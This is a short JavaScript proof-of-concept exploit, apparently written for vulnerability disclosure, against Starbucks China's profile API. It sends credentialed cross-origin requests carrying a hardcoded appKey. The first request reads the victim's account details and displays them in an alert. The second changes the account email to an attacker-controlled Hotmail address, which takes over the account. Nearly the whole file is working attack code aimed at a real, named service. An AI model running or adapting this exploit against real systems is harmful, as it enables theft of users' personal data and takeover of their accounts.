
async function patchData(url = '', data = {}) {
  // Default options are marked with *
  const response = await fetch(url, {
    method: 'PATCH', // *GET, POST, PUT, DELETE, etc.
    mode: 'cors', // no-cors, *cors, same-origin
    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
    credentials: 'include', // include, *same-origin, omit
    headers: {
      'Content-Type': 'application/json',
      'appKey': '8c2efe7006da1b98b5cf631e4791f2f5',
      'x-source-code': 'WEB'
    },
    redirect: 'follow', // manual, *follow, error
    referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    body: JSON.stringify(data) // body data type must match "Content-Type" header
  });
  return response.json(); // parses JSON response into native JavaScript objects
}

 
async function getData(url = '') {
  // Default options are marked with *
  const response = await fetch(url, {
    method: 'GET', // *GET, POST, PUT, DELETE, etc.
    mode: 'cors', // no-cors, *cors, same-origin
    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
    credentials: 'include', // include, *same-origin, omit
    headers: {
      'appKey': '8c2efe7006da1b98b5cf631e4791f2f5',
      'x-source-code': 'WEB'
    }
  });
  return response.json(); // parses JSON response into native JavaScript objects
}

//Try to steal the victim's profile
getData('https://profile.starbucks.com.cn/api/account/detail')
  .then(data => {
    alert("Your profile of starbucks account was stole by attacker!\n" + JSON.stringify(data)); // JSON data parsed by `data.json()` call
  });

//Try to takeover victim's account by modify the email address to attacker belongs
patchData('https://profile.starbucks.com.cn/api/account/email',{"email":"attacker_johnstone@hotmail.com","device":{"deviceExternalCode":"EjIrFdsfj4Q2bQQM4IgP48CZid4svYFh7W93S1M-YBEYhRwbLX9jIvkC28hSdgx19RdfMknxyd_CynVEh77fADsjB8uEwd0g4HB7uHHSCTKxclIPc_evb6N1jYv_NwdR18vRtD0r4YN8bARte-zAgc4mbKwe87yV","timezone":"+08:00","browserName":"Chrome","userAgent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36","language":"zh-CN"}})
  .then(data => {
    console.log(data); // JSON data parsed by `data.json()` call
  });
